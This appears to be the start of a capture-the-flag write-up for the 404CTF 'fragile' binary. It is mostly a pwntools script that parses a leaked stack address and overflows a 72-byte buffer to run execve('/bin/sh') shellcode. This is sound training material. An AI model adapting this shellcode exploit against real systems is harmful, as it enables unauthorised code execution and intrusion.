Before we start you need to download the binary from here : [Binary](./fragile).

Here we go, let's start by checking the architecture of the binary with : 
```console
file fragile
```
```python
from pwn import *

target = remote('challenge.404ctf.fr', 31720)
#target = process('./fragile') 

# Setting up the leak
# 0x7ffe3c40e910
screen = target.recvline().decode()
leak = target.recvline().decode().strip("Cadeau :").strip("\n")
leak = bytes(leak, 'utf-8')
leak = int(leak, 16)

# Print the leak
print(hex(leak))

# Setting up the Payload
payload = b""
payload += b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
payload += b"A"*(72 - len(payload))
payload += p64(leak)

#gdb.attach(target, gdbscript='b* 00400668')
target.sendline(payload)


target.interactive()
```

